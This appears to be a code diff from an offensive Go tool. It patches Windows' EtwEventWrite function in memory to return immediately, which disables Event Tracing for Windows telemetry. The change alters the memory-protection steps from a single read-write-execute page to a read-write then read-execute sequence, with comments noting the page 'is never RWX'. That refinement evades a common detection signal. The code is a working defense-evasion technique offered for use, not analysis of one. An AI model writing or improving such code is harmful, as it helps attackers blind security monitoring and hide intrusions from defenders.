@@ -26,11 +26,11 @@ func PatchETW() error {
 		return fmt.Errorf("resolve EtwEventWrite: %w", err)
 	}
 
-	// Change page protection to RWX so we can write
+	// Step 1: Change page protection to RW (writable, not executable)
 	var oldProtect uint32
-	err = windows.VirtualProtect(etwAddr, 3, windows.PAGE_EXECUTE_READWRITE, &oldProtect)
+	err = windows.VirtualProtect(etwAddr, 3, windows.PAGE_READWRITE, &oldProtect)
 	if err != nil {
-		return fmt.Errorf("VirtualProtect RWX: %w", err)
+		return fmt.Errorf("VirtualProtect RW: %w", err)
 	}
 
 	// Write the patch: xor eax, eax / ret
@@ -39,8 +39,8 @@ func PatchETW() error {
 	patch[1] = 0xC0
 	patch[2] = 0xC3 // ret
 
-	// Restore original protection
-	err = windows.VirtualProtect(etwAddr, 3, oldProtect, &oldProtect)
+	// Step 2: Flip to RX (executable, non-writable) — page is never RWX
+	err = windows.VirtualProtect(etwAddr, 3, windows.PAGE_EXECUTE_READ, &oldProtect)
 	if err != nil {
 		// Non-fatal
 	}
